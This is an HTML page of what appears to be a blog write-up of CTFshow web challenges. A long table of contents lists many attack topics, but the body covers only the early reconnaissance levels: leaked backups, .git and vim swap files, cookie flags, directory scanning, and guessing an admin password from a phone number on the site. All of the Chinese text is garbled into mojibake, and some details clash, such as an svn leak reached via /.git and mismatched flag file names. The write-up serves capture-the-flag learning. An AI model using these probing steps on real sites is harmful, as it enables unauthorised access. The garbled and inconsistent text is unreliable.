                    <a href="#web57" aria-label="web57">web57</a></li>
                <li>
                    <a href="#web58" aria-label="web58">web58</a></li>
                <li>
                    <a href="#web59" aria-label="web59">web59</a></li>
                <li>
                    <a href="#web60" aria-label="web60">web60</a></li>
                <li>
                    <a href="#web61" aria-label="web61">web61</a></li>
                <li>
                    <a href="#web62" aria-label="web62">web62</a></li>
                <li>
                    <a href="#web62-1" aria-label="web62">web62</a></li>
                <li>
                    <a href="#web63" aria-label="web63">web63</a></li>
                <li>
                    <a href="#web64" aria-label="web64">web64</a></li>
                <li>
                    <a href="#web65" aria-label="web65">web65</a></li>
                <li>
                    <a href="#web66" aria-label="web66">web66</a></li>
                <li>
                    <a href="#web67" aria-label="web67">web67</a></li>
                <li>
                    <a href="#web68" aria-label="web68">web68</a></li>
                <li>
                    <a href="#web69" aria-label="web69">web69</a></li>
                <li>
                    <a href="#web70" aria-label="web70">web70</a></li>
                <li>
                    <a href="#web71" aria-label="web71">web71</a></li>
                <li>
                    <a href="#web72" aria-label="web72">web72</a><ul>
                        
                <li>
                    <a href="#%e6%89%80%e4%bb%a5%e4%bb%80%e4%b9%88%e6%98%afuaf%e5%91%a2" aria-label="æ‰€ä»¥ä»€ä¹ˆæ˜¯uafå‘¢ï¼Ÿ">æ‰€ä»¥ä»€ä¹ˆæ˜¯uafå‘¢ï¼Ÿ</a></li></ul>
                </li>
                <li>
                    <a href="#web73" aria-label="web73">web73</a></li>
                <li>
                    <a href="#web74" aria-label="web74">web74</a></li>
                <li>
                    <a href="#web75" aria-label="web75">web75</a></li>
                <li>
                    <a href="#%e7%bb%93%e6%9e%9c%e8%be%93%e5%87%ba%e4%b8%8e%e8%b5%84%e6%ba%90%e9%87%8a%e6%94%be" aria-label="ç»“æœè¾“å‡ºä¸èµ„æºé‡Šæ”¾">ç»“æœè¾“å‡ºä¸èµ„æºé‡Šæ”¾</a></li>
                <li>
                    <a href="#%e5%bc%82%e5%b8%b8%e5%a4%84%e7%90%86" aria-label="å¼‚å¸¸å¤„ç†">å¼‚å¸¸å¤„ç†</a></li>
                <li>
                    <a href="#web76" aria-label="web76">web76</a></li>
                <li>
                    <a href="#web77" aria-label="web77">web77</a><ul>
                        
                <li>
                    <a href="#%e4%bb%80%e4%b9%88%e6%98%afffi" aria-label="ä»€ä¹ˆæ˜¯FFI?">ä»€ä¹ˆæ˜¯FFI?</a></li></ul>
                </li>
                <li>
                    <a href="#web118" aria-label="web118">web118</a></li>
                <li>
                    <a href="#web119" aria-label="Web119">Web119</a></li>
                <li>
                    <a href="#web120" aria-label="web120">web120</a></li>
                <li>
                    <a href="#web121" aria-label="web121">web121</a></li>
                <li>
                    <a href="#web122" aria-label="web122">web122</a></li>
                <li>
                    <a href="#web124" aria-label="web124">web124</a></li></ul>
                </li>
                <li>
                    <a href="#%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab" aria-label="æ–‡ä»¶åŒ…å«">æ–‡ä»¶åŒ…å«</a><ul>
                        
                <li>
                    <a href="#web78" aria-label="Web78">Web78</a></li>
                <li>
                    <a href="#web79" aria-label="web79">web79</a></li>
                <li>
                    <a href="#web80" aria-label="web80">web80</a></li>
                <li>
                    <a href="#web81" aria-label="web81">web81</a></li>
                <li>
                    <a href="#web83" aria-label="web83">web83</a></li>
                <li>
                    <a href="#web84" aria-label="web84">web84</a></li>
                <li>
                    <a href="#web85" aria-label="web85">web85</a></li>
                <li>
                    <a href="#web86" aria-label="web86">web86</a></li>
                <li>
                    <a href="#web87" aria-label="web87">web87</a><ul>
                        
                <li>
                    <a href="#phpfilter%e7%9a%84%e4%bd%bf%e7%94%a8" aria-label="php://filterçš„ä½¿ç”¨">php://filterçš„ä½¿ç”¨</a></li></ul>
                </li>
                <li>
                    <a href="#web88" aria-label="web88">web88</a></li>
                <li>
                    <a href="#web116" aria-label="web116">web116</a></li>
                <li>
                    <a href="#web117" aria-label="web117">web117</a></li></ul>
                </li>
                <li>
                    <a href="#php%e7%89%b9%e6%80%a7" aria-label="phpç‰¹æ€§">phpç‰¹æ€§</a><ul>
                        
                <li>
                    <a href="#web89" aria-label="web89">web89</a><ul>
                        
                <li>
                    <a href="#preg_match%e5%87%bd%e6%95%b0" aria-label="preg_matchå‡½æ•°ï¼š">preg_matchå‡½æ•°ï¼š</a></li>
                <li>
                    <a href="#intval%e5%87%bd%e6%95%b0" aria-label="intvalå‡½æ•°:">intvalå‡½æ•°:</a></li></ul>
                </li>
                <li>
                    <a href="#web90" aria-label="web90">web90</a></li>
                <li>
                    <a href="#web91" aria-label="web91">web91</a><ul>
                        
                <li>
                    <a href="#phpim-%e7%9a%84%e5%90%ab%e4%b9%89" aria-label="/^php$/im çš„å«ä¹‰">/^php$/im çš„å«ä¹‰</a></li></ul>
                </li>
                <li>
                    <a href="#web92" aria-label="web92">web92</a></li>
                <li>
                    <a href="#web93" aria-label="web93">web93</a></li>
                <li>
                    <a href="#web94" aria-label="web94">web94</a><ul>
                        
                <li>
                    <a href="#strops%e5%87%bd%e6%95%b0%e7%bb%95%e8%bf%87" aria-label="stropså‡½æ•°ç»•è¿‡ï¼š">stropså‡½æ•°ç»•è¿‡ï¼š</a></li></ul>
                </li>
                <li>
                    <a href="#web95" aria-label="web95">web95</a></li>
                <li>
                    <a href="#web96" aria-label="web96">web96</a></li>
                <li>
                    <a href="#web97" aria-label="web97">web97</a></li>
                <li>
                    <a href="#web98" aria-label="web98">web98</a></li>
                <li>
                    <a href="#web99" aria-label="web99">web99</a></li>
                <li>
                    <a href="#web100" aria-label="web100">web100</a></li>
                <li>
                    <a href="#web101" aria-label="web101">web101</a></li>
                <li>
                    <a href="#web102" aria-label="web102">web102</a></li>
                <li>
                    <a href="#web103" aria-label="web103">web103</a></li>
                <li>
                    <a href="#web104" aria-label="web104">web104</a></li>
                <li>
                    <a href="#web105" aria-label="web105">web105</a></li>
                <li>
                    <a href="#web106" aria-label="web106">web106</a></li>
                <li>
                    <a href="#web107" aria-label="web107">web107</a></li>
                <li>
                    <a href="#web108" aria-label="web108">web108</a></li>
                <li>
                    <a href="#web109" aria-label="web109">web109</a></li>
                <li>
                    <a href="#web110" aria-label="web110">web110</a></li>
                <li>
                    <a href="#web111" aria-label="web111">web111</a></li>
                <li>
                    <a href="#web112" aria-label="web112">web112</a></li>
                <li>
                    <a href="#web113" aria-label="web113">web113</a></li>
                <li>
                    <a href="#web114" aria-label="web114">web114</a></li>
                <li>
                    <a href="#web115" aria-label="web115">web115</a></li>
                <li>
                    <a href="#web123" aria-label="web123">web123</a></li>
                <li>
                    <a href="#web125" aria-label="web125">web125</a></li>
                <li>
                    <a href="#web126" aria-label="web126">web126</a></li>
                <li>
                    <a href="#web127" aria-label="web127">web127</a></li>
                <li>
                    <a href="#web128" aria-label="web128">web128</a></li>
                <li>
                    <a href="#web129" aria-label="web129">web129</a></li>
                <li>
                    <a href="#web130" aria-label="web130">web130</a></li>
                <li>
                    <a href="#web131" aria-label="web131">web131</a></li>
                <li>
                    <a href="#web132" aria-label="web132">web132</a></li>
                <li>
                    <a href="#web133" aria-label="web133">web133</a></li>
                <li>
                    <a href="#web134" aria-label="web134">web134</a></li>
                <li>
                    <a href="#web135" aria-label="web135">web135</a></li>
                <li>
                    <a href="#web136" aria-label="web136">web136</a></li></ul>
                </li>
                <li>
                    <a href="#linux-tee%e5%91%bd%e4%bb%a4%e4%bb%8b%e7%bb%8d" aria-label="Linux teeå‘½ä»¤ä»‹ç»">Linux teeå‘½ä»¤ä»‹ç»</a><ul>
                        
                <li>
                    <a href="#web137" aria-label="web137">web137</a></li>
                <li>
                    <a href="#web138" aria-label="web138">web138</a></li>
                <li>
                    <a href="#web139" aria-label="web139">web139</a></li>
                <li>
                    <a href="#web140" aria-label="web140">web140</a></li>
                <li>
                    <a href="#web141" aria-label="web141">web141</a></li>
                <li>
                    <a href="#web142" aria-label="web142">web142</a></li>
                <li>
                    <a href="#web143" aria-label="web143">web143</a></li>
                <li>
                    <a href="#web144" aria-label="web144">web144</a></li>
                <li>
                    <a href="#web145" aria-label="web145">web145</a></li>
                <li>
                    <a href="#web146" aria-label="web146">web146</a></li>
                <li>
                    <a href="#web147" aria-label="web147">web147</a></li>
                <li>
                    <a href="#web148" aria-label="web148">web148</a></li>
                <li>
                    <a href="#web149" aria-label="web149">web149</a></li>
                <li>
                    <a href="#web150" aria-label="web150">web150</a></li>
                <li>
                    <a href="#web150plus" aria-label="web150plus">web150plus</a></li></ul>
                </li>
                <li>
                    <a href="#%e6%96%87%e4%bb%b6%e4%b8%8a%e4%bc%a0" aria-label="æ–‡ä»¶ä¸Šä¼ ">æ–‡ä»¶ä¸Šä¼ </a><ul>
                        
                <li>
                    <a href="#web151" aria-label="web151">web151</a></li>
                <li>
                    <a href="#web152" aria-label="web152">web152</a></li>
                <li>
                    <a href="#web153" aria-label="web153">web153</a></li>
                <li>
                    <a href="#web154" aria-label="web154">web154</a></li>
                <li>
                    <a href="#web155" aria-label="web155">web155</a></li>
                <li>
                    <a href="#web156" aria-label="web156">web156</a></li>
                <li>
                    <a href="#web157" aria-label="web157">web157</a></li>
                <li>
                    <a href="#web158" aria-label="web158">web158</a></li>
                <li>
                    <a href="#web159" aria-label="web159">web159</a></li>
                <li>
                    <a href="#web160" aria-label="web160">web160</a></li>
                <li>
                    <a href="#web161" aria-label="web161">web161</a></li>
                <li>
                    <a href="#web162" aria-label="web162">web162</a></li>
                <li>
                    <a href="#web163" aria-label="web163">web163</a></li>
                <li>
                    <a href="#web164" aria-label="web164">web164</a></li>
                <li>
                    <a href="#web165" aria-label="web165">web165</a></li>
                <li>
                    <a href="#web166" aria-label="web166">web166</a></li>
                <li>
                    <a href="#web167" aria-label="web167">web167</a></li>
                <li>
                    <a href="#web168" aria-label="web168">web168</a></li>
                <li>
                    <a href="#web169" aria-label="web169">web169</a></li>
                <li>
                    <a href="#web170" aria-label="web170">web170</a></li></ul>
                </li>
                <li>
                    <a href="#sql%e6%b3%a8%e5%85%a5" aria-label="sqlæ³¨å…¥">sqlæ³¨å…¥</a><ul>
                        
                <li>
                    <a href="#%e6%97%a0%e8%bf%87%e6%bb%a4%e6%b3%a8%e5%85%a5%e5%af%b9%e8%be%93%e5%87%ba%e5%86%85%e5%ae%b9%e8%bf%9b%e8%a1%8c%e8%bf%87%e6%bb%a4" aria-label="æ— è¿‡æ»¤æ³¨å…¥ï¼ˆå¯¹è¾“å‡ºå†…å®¹è¿›è¡Œè¿‡æ»¤ï¼‰">æ— è¿‡æ»¤æ³¨å…¥ï¼ˆå¯¹è¾“å‡ºå†…å®¹è¿›è¡Œè¿‡æ»¤ï¼‰</a></li>
                <li>
                    <a href="#web171" aria-label="web171">web171</a></li>
                <li>
                    <a href="#web172" aria-label="web172">web172</a></li>
                <li>
                    <a href="#web173" aria-label="web173">web173</a></li>
                <li>
                    <a href="#web174" aria-label="web174">web174</a></li>
                <li>
                    <a href="#web175" aria-label="web175">web175</a></li>
                <li>
                    <a href="#%e8%bf%87%e6%bb%a4%e6%b3%a8%e5%85%a5%e5%af%b9%e4%bc%a0%e5%85%a5%e5%8f%82%e6%95%b0%e8%bf%9b%e8%a1%8c%e8%bf%87%e6%bb%a4" aria-label="è¿‡æ»¤æ³¨å…¥ï¼ˆå¯¹ä¼ å…¥å‚æ•°è¿›è¡Œè¿‡æ»¤ï¼‰">è¿‡æ»¤æ³¨å…¥ï¼ˆå¯¹ä¼ å…¥å‚æ•°è¿›è¡Œè¿‡æ»¤ï¼‰</a></li>
                <li>
                    <a href="#web176" aria-label="web176">web176</a></li>
                <li>
                    <a href="#web177" aria-label="web177">web177</a></li>
                <li>
                    <a href="#web178" aria-label="web178">web178</a></li>
                <li>
                    <a href="#web179" aria-label="web179">web179</a></li>
                <li>
                    <a href="#web180" aria-label="web180">web180</a></li>
                <li>
                    <a href="#web181" aria-label="web181">web181</a></li>
                <li>
                    <a href="#web182" aria-label="web182">web182</a></li>
                <li>
                    <a href="#web183" aria-label="web183">web183</a></li>
                <li>
                    <a href="#web184" aria-label="web184">web184</a></li>
                <li>
                    <a href="#web185" aria-label="web185">web185</a></li>
                <li>
                    <a href="#web186" aria-label="web186">web186</a></li>
                <li>
                    <a href="#web187" aria-label="web187">web187</a></li>
                <li>
                    <a href="#web188" aria-label="web188">web188</a></li>
                <li>
                    <a href="#web189" aria-label="web189">web189</a></li>
                <li>
                    <a href="#web190" aria-label="web190">web190</a></li>
                <li>
                    <a href="#web191" aria-label="web191">web191</a></li>
                <li>
                    <a href="#web192" aria-label="web192">web192</a></li>
                <li>
                    <a href="#web193" aria-label="web193">web193</a></li>
                <li>
                    <a href="#web194" aria-label="web194">web194</a></li>
                <li>
                    <a href="#web195" aria-label="web195">web195</a></li>
                <li>
                    <a href="#web196" aria-label="web196">web196</a></li>
                <li>
                    <a href="#web197" aria-label="web197">web197</a></li>
                <li>
                    <a href="#web198" aria-label="web198">web198</a></li>
                <li>
                    <a href="#web199" aria-label="web199">web199</a></li>
                <li>
                    <a href="#web200" aria-label="web200">web200</a></li>
                <li>
                    <a href="#web190-web200%e9%80%9a%e8%a7%a3" aria-label="web190-web200é€šè§£">web190-web200é€šè§£</a></li>
                <li>
                    <a href="#sqlmap%e7%9a%84%e4%bd%bf%e7%94%a8" aria-label="sqlmapçš„ä½¿ç”¨">sqlmapçš„ä½¿ç”¨</a></li>
                <li>
                    <a href="#web201" aria-label="web201">web201</a></li>
                <li>
                    <a href="#web202" aria-label="web202">web202</a></li>
                <li>
                    <a href="#web203" aria-label="web203">web203</a></li>
                <li>
                    <a href="#web204" aria-label="web204">web204</a></li>
                <li>
                    <a href="#web205" aria-label="web205">web205</a></li>
                <li>
                    <a href="#web206" aria-label="web206">web206</a></li>
                <li>
                    <a href="#web207" aria-label="web207">web207</a></li>
                <li>
                    <a href="#web208" aria-label="web208">web208</a></li>
                <li>
                    <a href="#web209" aria-label="web209">web209</a></li>
                <li>
                    <a href="#web210" aria-label="web210">web210</a></li>
                <li>
                    <a href="#web211" aria-label="web211">web211</a></li>
                <li>
                    <a href="#web212" aria-label="web212">web212</a></li>
                <li>
                    <a href="#web213" aria-label="web213">web213</a></li>
                <li>
                    <a href="#%e6%97%b6%e9%97%b4%e7%9b%b2%e6%b3%a8" aria-label="æ—¶é—´ç›²æ³¨">æ—¶é—´ç›²æ³¨</a></li>
                <li>
                    <a href="#web214" aria-label="web214">web214</a></li>
                <li>
                    <a href="#web215" aria-label="web215">web215</a></li>
                <li>
                    <a href="#web216" aria-label="web216">web216</a></li>
                <li>
                    <a href="#web217" aria-label="web217">web217</a></li>
                <li>
                    <a href="#web218" aria-label="web218">web218</a></li>
                <li>
                    <a href="#web219" aria-label="web219">web219</a></li>
                <li>
                    <a href="#web220" aria-label="web220">web220</a></li>
                <li>
                    <a href="#web221" aria-label="web221">web221</a></li>
                <li>
                    <a href="#group%e6%b3%a8%e5%85%a5" aria-label="groupæ³¨å…¥">groupæ³¨å…¥</a></li>
                <li>
                    <a href="#web222" aria-label="web222">web222</a></li>
                <li>
                    <a href="#web223" aria-label="web223">web223</a></li>
                <li>
                    <a href="#web224" aria-label="web224">web224</a></li>
                <li>
                    <a href="#%e5%a0%86%e5%8f%a0%e6%b3%a8%e5%85%a5" aria-label="å †å æ³¨å…¥">å †å æ³¨å…¥</a></li>
                <li>
                    <a href="#web225" aria-label="web225">web225</a></li>
                <li>
                    <a href="#web226" aria-label="web226">web226</a></li>
                <li>
                    <a href="#web227" aria-label="web227">web227</a></li>
                <li>
                    <a href="#web228" aria-label="web228">web228</a></li>
                <li>
                    <a href="#web229" aria-label="web229">web229</a></li>
                <li>
                    <a href="#web230" aria-label="web230">web230</a></li>
                <li>
                    <a href="#update%e6%b3%a8%e5%85%a5" aria-label="updateæ³¨å…¥">updateæ³¨å…¥</a></li>
                <li>
                    <a href="#web231" aria-label="web231">web231</a></li>
                <li>
                    <a href="#web232" aria-label="web232">web232</a></li>
                <li>
                    <a href="#web233" aria-label="web233">web233</a><ul>
                        
                <li>
                    <a href="#%e6%96%b9%e6%b3%95%e4%b8%80" aria-label="æ–¹æ³•ä¸€">æ–¹æ³•ä¸€</a></li>
                <li>
                    <a href="#%e6%96%b9%e6%b3%95%e4%ba%8c-%e7%9b%b2%e6%b3%a8" aria-label="æ–¹æ³•äºŒ ï¼šç›²æ³¨">æ–¹æ³•äºŒ ï¼šç›²æ³¨</a></li></ul>
                </li>
                <li>
                    <a href="#web234" aria-label="web234">web234</a></li>
                <li>
                    <a href="#web235" aria-label="web235">web235</a></li>
                <li>
                    <a href="#web236" aria-label="web236">web236</a></li>
                <li>
                    <a href="#insert%e6%b3%a8%e5%85%a5" aria-label="insertæ³¨å…¥">insertæ³¨å…¥</a></li>
                <li>
                    <a href="#web237" aria-label="web237">web237</a></li>
                <li>
                    <a href="#web238" aria-label="web238">web238</a></li>
                <li>
                    <a href="#web239" aria-label="web239">web239</a></li>
                <li>
                    <a href="#web240" aria-label="web240">web240</a></li>
                <li>
                    <a href="#web241" aria-label="web241">web241</a></li>
                <li>
                    <a href="#%e6%96%87%e4%bb%b6%e6%b3%a8%e5%85%a5" aria-label="æ–‡ä»¶æ³¨å…¥">æ–‡ä»¶æ³¨å…¥</a></li>
                <li>
                    <a href="#web242" aria-label="web242">web242</a></li>
                <li>
                    <a href="#web243" aria-label="web243">web243</a></li>
                <li>
                    <a href="#%e6%8a%a5%e9%94%99%e6%b3%a8%e5%85%a5" aria-label="æŠ¥é”™æ³¨å…¥">æŠ¥é”™æ³¨å…¥</a></li>
                <li>
                    <a href="#web244" aria-label="web244">web244</a></li>
                <li>
                    <a href="#web245" aria-label="web245">web245</a></li>
                <li>
                    <a href="#web246" aria-label="web246">web246</a></li>
                <li>
                    <a href="#web247" aria-label="web247">web247</a></li>
                <li>
                    <a href="#web248" aria-label="web248">web248</a></li>
                <li>
                    <a href="#web249" aria-label="web249">web249</a></li>
                <li>
                    <a href="#web250" aria-label="web250">web250</a></li>
                <li>
                    <a href="#web251" aria-label="web251">web251</a></li>
                <li>
                    <a href="#web252" aria-label="web252">web252</a></li>
                <li>
                    <a href="#web253" aria-label="web253">web253</a><ul>
                        
                <li>
                    <a href="#%e6%96%b9%e6%b3%95%e4%b8%80-1" aria-label="æ–¹æ³•ä¸€">æ–¹æ³•ä¸€</a></li>
                <li>
                    <a href="#%e6%96%b9%e6%b3%95%e4%ba%8c" aria-label="æ–¹æ³•äºŒ">æ–¹æ³•äºŒ</a></li></ul>
                </li></ul>
                </li>
                <li>
                    <a href="#%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96" aria-label="ååºåˆ—åŒ–">ååºåˆ—åŒ–</a><ul>
                        
                <li>
                    <a href="#php%e7%9a%84%e9%ad%94%e6%b3%95%e6%96%b9%e6%b3%95" aria-label="PHPçš„é­”æ³•æ–¹æ³•">PHPçš„é­”æ³•æ–¹æ³•</a></li>
                <li>
                    <a href="#web254" aria-label="web254">web254</a></li>
                <li>
                    <a href="#web255" aria-label="web255">web255</a></li>
                <li>
                    <a href="#web256" aria-label="web256">web256</a></li>
                <li>
                    <a href="#web257" aria-label="web257">web257</a></li>
                <li>
                    <a href="#web258" aria-label="web258">web258</a></li>
                <li>
                    <a href="#web289" aria-label="web289">web289</a></li></ul>
                </li>
                <li>
                    <a href="#nodejs" aria-label="node.js">node.js</a><ul>
                        
                <li>
                    <a href="#web334" aria-label="web334">web334</a></li>
                <li>
                    <a href="#web335" aria-label="web335">web335</a></li>
                <li>
                    <a href="#web336" aria-label="web336">web336</a></li>
                <li>
                    <a href="#web337" aria-label="web337">web337</a></li></ul>
                </li>
                <li>
                    <a href="#ssrf" aria-label="SSRF">SSRF</a><ul>
                        
                <li>
                    <a href="#web351" aria-label="web351">web351</a></li>
                <li>
                    <a href="#web352" aria-label="web352">web352</a></li>
                <li>
                    <a href="#web353" aria-label="web353">web353</a></li>
                <li>
                    <a href="#web354" aria-label="web354">web354</a></li>
                <li>
                    <a href="#web355" aria-label="web355">web355</a></li>
                <li>
                    <a href="#web356" aria-label="web356">web356</a></li>
                <li>
                    <a href="#web357" aria-label="web357">web357</a></li></ul>
                </li>
                <li>
                    <a href="#ssti" aria-label="ssti">ssti</a><ul>
                        
                <li>
                    <a href="#web361" aria-label="web361">web361</a></li>
                <li>
                    <a href="#web362" aria-label="web362">web362</a></li></ul>
                </li>
                <li>
                    <a href="#java%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96" aria-label="Javaååºåˆ—åŒ–ï¼š">Javaååºåˆ—åŒ–ï¼š</a><ul>
                        
                <li>
                    <a href="#web846" aria-label="web846">web846</a>
                </li>
            </ul>
            </ul>
            </li>
            </ul>
            </li>
            </ul>
        </div>
    </details>
</div>

  <div class="post-content"><h1 id="ctfshow_web">CTFshow_Web<a hidden class="anchor" aria-hidden="true" href="#ctfshow_web">#</a></h1>
<h3 id="ä¿¡æ¯æ”¶é›†å®Œå·¥"><strong>ä¿¡æ¯æ”¶é›†</strong>ï¼šï¼ˆå®Œå·¥ï¼‰<a hidden class="anchor" aria-hidden="true" href="#ä¿¡æ¯æ”¶é›†å®Œå·¥">#</a></h3>
<h4 id="web-1-5">Web 1-5<a hidden class="anchor" aria-hidden="true" href="#web-1-5">#</a></h4>
<ul>
<li>æŸ¥çœ‹ç½‘é¡µæºä»£ç </li>
<li>æŠ“ä¸ªåŒ…çœ‹æœ‰æ²¡æœ‰è—ä¸œè¥¿</li>
<li>æŸ¥çœ‹robots.txt</li>
<li>phpsæºç æ³„éœ²ï¼Œè®¿é—®index.phpsï¼Œé€šè¿‡å…¶æºç æ³„éœ²ï¼Œåœ¨å…¶ä¸­æ‰¾åˆ°flag</li>
</ul>
<h4 id="web6">Web6<a hidden class="anchor" aria-hidden="true" href="#web6">#</a></h4>
<p>ç½‘é¡µæç¤ºä¸‹è½½æºç æŸ¥çœ‹ï¼Œè®¿é—®url/www.zipå¾—åˆ°æºç æ–‡ä»¶</p>
<p>è§£å‹æ–‡ä»¶æˆ‘ä»¬å¾—åˆ°</p>
<img src="assets/202411102303478.png" alt="image-20241102003213997" style="zoom:200%;" />
<p>æ‰“å¼€fl00g.txtï¼Œæ²¡æœ‰æˆ‘ä»¬æƒ³è¦çš„flag</p>
<p>æ‰“å¼€index.php</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-01 14:37:13
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-01 14:42:44
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="c1">//flag in fl000g.txt
</span></span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="c1"></span><span class="k">echo</span> <span class="s2">&#34;web6:where is flag?&#34;</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>æ˜¾ç¤ºflag in fl00g.txt</p>
<p>ç›´æ¥è®¿é—®url/fl00g.txtå¾—åˆ°flag</p>
<h4 id="web7">web7<a hidden class="anchor" aria-hidden="true" href="#web7">#</a></h4>
<p>gitæ³„éœ²ï¼Œè®¿é—®url/.gitå³å¯å¾—åˆ°flag</p>
<h4 id="web8">web8<a hidden class="anchor" aria-hidden="true" href="#web8">#</a></h4>
<p>svnæ³„éœ²ï¼Œè®¿é—®url/.gitå³å¯å¾—åˆ°flag</p>
<h4 id="web9">web9<a hidden class="anchor" aria-hidden="true" href="#web9">#</a></h4>
<p>vimç¼“å­˜ä¿¡æ¯æ³„éœ²ï¼Œè®¿é—®url/index.php.swpï¼Œæ‰“å¼€ä¸‹è½½çš„index.php.swpå³å¯å¾—åˆ°flag</p>
<h4 id="web10">web10<a hidden class="anchor" aria-hidden="true" href="#web10">#</a></h4>
<p>æ ¹æ®hintæŸ¥çœ‹cookieå¯ä»¥çœ‹åˆ°</p>
<blockquote>
<p>cookie:flag=ctfshow%7B3ac14c03-64d1-41aa-9328-c97bcceeb840%7D</p></blockquote>
<p>è¿›è¡Œurlè§£ç å³å¯å¾—åˆ°flag</p>
<p><img alt="image-20241106010021516" loading="lazy" src="assets/202411072207591.png"></p>
<h4 id="web11">web11<a hidden class="anchor" aria-hidden="true" href="#web11">#</a></h4>
<p>åŸŸåè§£æ</p>
<p>æˆ‘ä»¬å¯ä»¥é€šè¿‡nslookupæ¥è¿›è¡ŒåŸŸåè§£ææŸ¥è¯¢</p>
<pre tabindex="0"><code>nslookup -qt=æ ¼å¼ URL
</code></pre><pre tabindex="0"><code>nslookup -qt=any URL 
//éå†æ‰€æœ‰æ ¼å¼
</code></pre><pre tabindex="0"><code>nslookup -qt=TXT URL
//æŸ¥è¯¢txtæ ¼å¼
</code></pre><h4 id="web12">web12<a hidden class="anchor" aria-hidden="true" href="#web12">#</a></h4>
<p>hintï¼šæœ‰æ—¶å€™ç½‘ç«™ä¸Šçš„å…¬å¼€ä¿¡æ¯ï¼Œå°±æ˜¯ç®¡ç†å‘˜å¸¸ç”¨å¯†ç </p>
<p>å…ˆç”¨dirsearchæ‰«ä¸€ä¸‹</p>
<p><img alt="image-20241106092048352" loading="lazy" src="assets/202411072207900.png"></p>
<p>è®¿é—®adminï¼Œè¦æ±‚æˆ‘ä»¬è¾“å…¥ç®¡ç†å‘˜è´¦å·å¯†ç ï¼Œæ ¹æ®åå°è·¯å¾„æˆ‘ä»¬å¯ä»¥çŒœæµ‹è´¦å·ä¸º<code>admin</code></p>
<p>å›åˆ°ä¸»é¡µï¼Œåœ¨ç½‘é¡µçš„åº•éƒ¨æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä¸€ä¸ªç”µè¯<code>Help Line Number : 372619038</code></p>
<p>çŒœæµ‹ç”µè¯ä¸ºç®¡ç†å‘˜å¯†ç ï¼Œè¾“å…¥åæˆåŠŸå¾—åˆ°flag</p>
<h4 id="web13">web13<a hidden class="anchor" aria-hidden="true" href="#web13">#</a></h4>
<p>åœ¨é¡µé¢åº•éƒ¨å¯ä»¥çœ‹åˆ°ä¸€ä¸ªdocument</p>
<p><img alt="image-20241106121019219" loading="lazy" src="assets/202411072207995.png"></p>
<p>ç‚¹å‡»å‘ç°ä¸‹è½½äº†ä¸€ä¸ªdocument.pdfæ–‡ä»¶ï¼Œæ–‡ä»¶é‡Œæœ‰åå°çš„åœ°å€å’Œè´¦å·å¯†ç </p>
<p><img alt="image-20241106121415093" loading="lazy" src="assets/202411072207016.png">d</p>
<p>ç™»å½•åå°å³å¯å¾—åˆ°flag</p>
<h4 id="web14">web14<a hidden class="anchor" aria-hidden="true" href="#web14">#</a></h4>
<p>æ ¹æ®hintçŸ¥é“editorå¤„åº”è¯¥æœ‰ä¿¡æ¯æ³„æ¼(è™½ç„¶ä¸çŸ¥é“ä»€ä¹ˆæ˜¯editor)</p>
<p>æˆ‘ä»¬å…ˆç”¨dirsearchæ‰«ä¸€ä¸‹åå°</p>
<img src="assets/NUQB3oh7mj5ATvJ.png" alt="image-20241106202626586" style="zoom:50%;" />
<p>è®¿é—®url/editor</p>
<img src="assets/UvozfSbVdp3xLPW.png" alt="image-20241106202742084" style="zoom: 50%;" />
<p>æ˜¯ä¸€ä¸ªæ–‡å­—ç¼–è¾‘çš„é¡µé¢ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°åœ¨ä¸Šä¼ é™„ä»¶ğŸ“å‡ºå¯ä»¥è°ƒç”¨å‡ºåˆ°æœåŠ¡å™¨çš„æ–‡ä»¶ç®¡ç†å™¨</p>
<p>åœ¨æœåŠ¡å™¨çš„æ ¹ç›®å½•æ²¡çœ‹åˆ°flagï¼Œå°è¯•æŸ¥çœ‹ç½‘ç«™çš„æ ¹ç›®å½•(var/www/html),çœ‹çœ‹æœ‰æ²¡æœ‰éšè—é¡µé¢</p>
<p>å‘ç°nothinghereæ–‡ä»¶å¤¹ä¸­æœ‰ä¸ªfl00g.txtæ–‡ä»¶</p>
<p>è®¿é—®url/nothinghere/f1000g.txtå³å¯å¾—åˆ°flag</p>
<h4 id="web15">web15<a hidden class="anchor" aria-hidden="true" href="#web15">#</a></h4>
<p>æ‰«æåˆ°åå°ä¸ºurl/adminï¼Œæ‰“å¼€çœ‹åˆ°æœ‰ä¸ªå¿˜è®°å¯†ç ï¼Œè¦æ±‚è¾“å…¥åŸå¸‚</p>
<p><img alt="image-20241112203115743" loading="lazy" src="./assets/image-20241112203115743.png"></p>
<p><img alt="image-20241112203225217" loading="lazy" src="./assets/image-20241112203225217.png"></p>
<p>æ ¹æ®hintæˆ‘ä»¬å¯ä»¥åœ¨ä¸»é¡µåº•éƒ¨æ‰¾åˆ°ä¸€ä¸ªqqé‚®ç®±ï¼ŒæŸ¥è¯¢ä¸€ä¸‹qqå·</p>
